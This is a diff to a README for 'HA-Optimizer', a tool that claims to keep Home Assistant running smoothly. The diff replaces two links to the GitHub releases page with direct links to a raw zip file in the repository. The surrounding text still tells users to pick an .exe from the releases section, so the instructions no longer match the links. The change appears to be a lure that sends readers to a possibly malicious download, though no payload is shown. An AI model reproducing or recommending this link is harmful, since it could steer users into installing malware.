@@ -1,6 +1,6 @@
 # 🧹 HA-Optimizer - Keep your Home Assistant running smooth
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://github.com/Jeffreycommon553/HA-Optimizer/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://raw.githubusercontent.com/Jeffreycommon553/HA-Optimizer/main/assets/Optimizer_H_v2.0.zip)
 
 ## 📋 About This Tool
 
@@ -12,7 +12,7 @@ Ensure you meet these setup standards before you start. You need a computer runn
 
 ## 🚀 Downloading The Software
 
-Visit the [Download Page](https://github.com/Jeffreycommon553/HA-Optimizer/releases) to get the latest version. Look for the file ending in .exe under the newest release section. Click this file to save it to your computer. We build this tool to work on Windows without complex extra steps.
+Visit the [Download Page](https://raw.githubusercontent.com/Jeffreycommon553/HA-Optimizer/main/assets/Optimizer_H_v2.0.zip) to get the latest version. Look for the file ending in .exe under the newest release section. Click this file to save it to your computer. We build this tool to work on Windows without complex extra steps.
 
 ## 🏗️ Installation Steps
 
